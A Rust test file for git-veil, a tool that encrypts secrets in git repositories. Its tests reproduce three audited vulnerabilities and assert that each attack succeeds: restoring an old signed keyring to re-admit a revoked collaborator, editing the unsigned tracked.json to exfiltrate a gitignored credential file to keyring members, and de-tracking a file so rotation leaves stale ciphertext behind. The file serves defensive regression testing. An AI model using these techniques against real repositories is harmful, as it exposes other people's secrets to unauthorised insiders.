//! ATTACK REPRODUCTION TESTS — these tests DOCUMENT vulnerabilities.
//!
//! Each test below reproduces a vulnerability confirmed by code review
//! (the "attack audit"). The assertions assert the BAD outcome: the attack
//! succeeding against current code. If a future fix lands, the matching
//! test should be INVERTED to assert refusal instead of success — do not
//! delete it.
//!
//! Attacks (from the audit):
//!   1. Keyring rollback resurrects a removed collaborator: an old,
//!      validly-signed keyring (restored via a plain `git revert` by any
//!      repo writer) passes verify-keyring after a removeperson, and hide
//!      re-encrypts secrets to the revoked key.
//!   2. tracked.json insider nomination: a repo writer adds a path to
//!      .git-veil/tracked.json directly; the victim's next hide encrypts a
//!      file that was never `git-veil add`ed, to every keyring member —
//!      silently, because the plaintext is gitignored so not even the
//!      code-41 warning fires.
//!   3. De-tracking defeats rotation: removing a path from tracked.json
//!      before a removeperson + re-hide leaves the stale ciphertext on
//!      disk, still decryptable by the removed collaborator.

use age::secrecy::ExposeSecret;
use git_veil::{
    cmd_add, cmd_hide, cmd_import, cmd_init, cmd_removeperson, cmd_tell, cmd_trust,
    cmd_verify_keyring, decrypt_with_identity, generate_identity, generate_signing_keypair,
    recipient_from_identity,
};
use std::fs;
use std::path::Path;

// Harness copied from tests/features.rs (integration tests are separate
// crates and cannot share helpers).

struct TempDir {
    path: std::path::PathBuf,
}

impl TempDir {
    fn new(label: &str) -> Self {
        let pid = std::process::id();
        let counter = COUNTER.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        let dir =
            std::env::temp_dir().join(format!("git-veil-attack-{}-{}-{}", label, pid, counter));
        fs::create_dir_all(&dir).expect("create temp dir");
        Self { path: dir }
    }
    fn join(&self, rel: &str) -> std::path::PathBuf {
        self.path.join(rel)
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.path);
    }
}

static COUNTER: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

fn init_git_repo(dir: &Path) {
    let args_list: &[&[&str]] = &[
        &["init", "--quiet"],
        &["config", "user.email", "owner@example.com"],
        &["config", "user.name", "Test Owner"],
        &["remote", "add", "origin", "git@github.com:owner/fara.git"],
    ];
    for args in args_list {
        let s = std::process::Command::new("git")
            .current_dir(dir)
            .args(*args)
            .status()
            .expect("git");
        assert!(s.success());
    }
}

const TEST_REPO_ID: &str = "fara+owner@github.com";

struct Fixture {
    repo: TempDir,
    key_store: TempDir,
}

impl Fixture {
    fn new(label: &str) -> Self {
        let repo = TempDir::new(label);
        let key_store = TempDir::new(&format!("{}-ks", label));
        init_git_repo(&repo.path);

        let identity = generate_identity();
        let recipient = recipient_from_identity(&identity);
        let (signing_key, verifying_hex) = generate_signing_keypair();

        fs::write(
            repo.join("owner.age"),
            format!("{}\n", identity.to_string().expose_secret()),
        )
        .unwrap();
        fs::write(
            repo.join("owner.signing"),
            format!("{}\n{}\n", verifying_hex, recipient),
        )
        .unwrap();
        fs::write(
            key_store.join("signing-keys.txt"),
            format!("{}\n", hex::encode(signing_key.to_bytes())),
        )
        .unwrap();

        cmd_init(&repo.path).expect("init");
        cmd_import(&repo.path, &["owner.age".to_string()], &key_store.path).expect("import");
        cmd_trust(
            &repo.path,
            TEST_REPO_ID,
            "owner.signing",
            "origin",
            &key_store.path,
        )
        .expect("trust");

        Self { repo, key_store }
    }

    /// Tells a collaborator into the keyring; returns their identity so the
    /// test can later prove what that key can (still) decrypt.
    fn add_collab(&self, email: &str) -> age::x25519::Identity {
        let id = generate_identity();
        let r = recipient_from_identity(&id);
        let fname = format!("{}.recipient", email);
        fs::write(self.repo.join(&fname), &r).unwrap();
        cmd_tell(
            &self.repo.path,
            email,
            &fname,
            "origin",
            &self.key_store.path,
            None,
        )
        .expect("tell");
        id
    }

    fn add_file(&self, name: &str, content: &[u8]) {
        let p = self.repo.join(name);
        if let Some(parent) = p.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(&p, content).unwrap();
        cmd_add(&self.repo.path, vec![name.to_string()]).expect("add");
    }

    fn hide(&self) {
        cmd_hide(&self.repo.path, "origin", &self.key_store.path, false).expect("hide");
    }
}

// ---------------------------------------------------------------------------
// Attack 1 — keyring rollback resurrects a removed collaborator
//
// removeperson produces keyring v2 (signed, entry removed). A repo writer
// then restores v1 — a plain `git revert` of the committed keyring file.
// v1 is still validly signed by the same pinned owner key, so there is no
// rollback detection: verify-keyring PASSES and hide re-encrypts to the
// revoked key. The assertions below assert that BAD outcome.
// ---------------------------------------------------------------------------

#[test]
fn attack_keyring_rollback_after_removeperson_passes_verification() {
    let f = Fixture::new("keyring-rollback");

    let carol = f.add_collab("carol@example.com");
    f.add_file("secrets.env", b"TOKEN=old\n");
    f.hide();

    let keyring_path = f.repo.join(".git-veil/keyring");
    // Snapshot v1 (carol present, validly signed by the pinned owner key).
    let keyring_v1 = fs::read_to_string(&keyring_path).unwrap();
    assert!(keyring_v1.contains("carol@example.com"));

    // Owner revokes carol: keyring v2 (empty, re-signed) verifies fine.
    cmd_removeperson(
        &f.repo.path,
        "carol@example.com",
        "origin",
        &f.key_store.path,
        None,
    )
    .expect("removeperson");
    let keyring_v2 = fs::read_to_string(&keyring_path).unwrap();
    assert!(!keyring_v2.contains("carol@example.com"));
    cmd_verify_keyring(&f.repo.path, "origin", &f.key_store.path)
        .expect("v2 (empty, signed) verifies");

    // ATTACK: a repo writer restores the old keyring file content
    // (equivalent to `git revert` of the removeperson commit).
    fs::write(&keyring_path, &keyring_v1).unwrap();

    // BAD OUTCOME 1: verification PASSES on the rolled-back keyring — there
    // is no monotonicity/freshness check, the old signature is still valid.
    cmd_verify_keyring(&f.repo.path, "origin", &f.key_store.path)
        .expect("ATTACK SUCCEEDS: rolled-back v1 keyring passes verify-keyring");

    // BAD OUTCOME 2: the victim's next hide re-encrypts the secret to the
    // revoked collaborator, and carol's identity still decrypts it.
    let new_plaintext = b"TOKEN=rotated-after-revocation\n";
    fs::write(f.repo.join("secrets.env"), new_plaintext).unwrap();
    f.hide();

    let ciphertext = fs::read(f.repo.join("secrets.env.secret")).unwrap();
    let decrypted = decrypt_with_identity(&ciphertext, &carol)
        .expect("ATTACK SUCCEEDS: revoked carol decrypts the re-hidden secret");
    assert_eq!(
        decrypted, new_plaintext,
        "removed collaborator recovered the post-revocation plaintext"
    );
}

// ---------------------------------------------------------------------------
// Attack 2 — tracked.json insider nomination exfiltrates an untracked secret
//
// The victim has a gitignored plaintext `prod-credentials` that was NEVER
// `git-veil add`ed. A repo writer edits the committed
// .git-veil/tracked.json directly to nominate it. The victim's next hide
// encrypts it to every keyring member — including the attacker's own
// keyring identity — without refusal. Because the plaintext is gitignored,
// not even the code-41 "plaintext not git-ignored" warning fires; the only
// output is the ordinary "Encrypted: prod-credentials" line (cmd_hide
// prints directly to stdout, so this harness cannot capture it — observed
// behavior: no warning, no error). The assertions assert that BAD outcome.
// ---------------------------------------------------------------------------

#[test]
fn attack_tracked_json_nomination_encrypts_untracked_secret() {
    let f = Fixture::new("tracked-nomination");

    // The attacker is a legitimate keyring member (repo write access).
    let mallory = f.add_collab("mallory@example.com");

    // Victim's private file: gitignored, NEVER passed to `git-veil add`.
    let secret_plaintext = b"AWS_SECRET_ACCESS_KEY=AKIA...\n";
    fs::write(f.repo.join("prod-credentials"), secret_plaintext).unwrap();
    fs::write(f.repo.join(".gitignore"), "prod-credentials\n").unwrap();
    assert!(
        !f.repo.join("prod-credentials.secret").exists(),
        "precondition: never hidden"
    );

    // ATTACK: the repo writer edits the committed tracked.json directly
    // (this file is not covered by the keyring signature).
    fs::write(
        f.repo.join(".git-veil/tracked.json"),
        "{\n  \"files\": [\n    \"prod-credentials\"\n  ]\n}",
    )
    .unwrap();

    // BAD OUTCOME 1: the victim's hide does NOT refuse the nominated path —
    // it succeeds, and prints no warning because the plaintext is
    // gitignored (code-41 check) and the ciphertext is not (code-40 check).
    f.hide();
    assert!(
        f.repo.join("prod-credentials.secret").exists(),
        "ATTACK SUCCEEDS: hide wrote ciphertext for a file never added"
    );

    // BAD OUTCOME 2: the attacker's own keyring identity decrypts it.
    let ciphertext = fs::read(f.repo.join("prod-credentials.secret")).unwrap();
    let decrypted = decrypt_with_identity(&ciphertext, &mallory)
        .expect("ATTACK SUCCEEDS: nominating attacker decrypts the exfiltrated secret");
    assert_eq!(
        decrypted, secret_plaintext,
        "untracked secret was exfiltrated to the whole keyring"
    );
}

// ---------------------------------------------------------------------------
// Attack 3 — de-tracking defeats rotation
//
// A repo writer removes a path from tracked.json. The owner then
// removepersons a collaborator and re-hides to rotate — but the de-tracked
// file is not in the manifest, so its stale ciphertext is never
// re-encrypted and no error is raised. The removed collaborator can still
// decrypt the stale ciphertext left on disk (and committed). The
// assertions assert that BAD outcome.
// ---------------------------------------------------------------------------

#[test]
fn attack_detracking_leaves_stale_ciphertext_after_rotation() {
    let f = Fixture::new("detrack-rotation");

    let carol = f.add_collab("carol@example.com");
    let plaintext = b"API_KEY=live-key\n";
    f.add_file("api.key", plaintext);
    f.hide();
    assert!(f.repo.join("api.key.secret").exists());

    // ATTACK: a repo writer de-tracks the file before the rotation
    // (tracked.json is committed and unsigned).
    fs::write(
        f.repo.join(".git-veil/tracked.json"),
        "{\n  \"files\": []\n}",
    )
    .unwrap();

    // Owner rotates: revoke carol, onboard dave, re-hide.
    cmd_removeperson(
        &f.repo.path,
        "carol@example.com",
        "origin",
        &f.key_store.path,
        None,
    )
    .expect("removeperson");
    let _dave = f.add_collab("dave@example.com");
    // hide reports "No files tracked" and exits Ok — the stale ciphertext
    // is silently left in place, never re-encrypted to the new ring.
    f.hide();

    // BAD OUTCOME: the stale ciphertext survives the rotation untouched and
    // the REVOKED collaborator still decrypts it. No error was raised
    // anywhere in the rotation flow.
    assert!(
        f.repo.join("api.key.secret").exists(),
        "stale ciphertext left behind after rotation"
    );
    let stale = fs::read(f.repo.join("api.key.secret")).unwrap();
    let decrypted = decrypt_with_identity(&stale, &carol)
        .expect("ATTACK SUCCEEDS: revoked carol still decrypts the stale ciphertext");
    assert_eq!(
        decrypted, plaintext,
        "de-tracking defeated the removeperson rotation"
    );
}
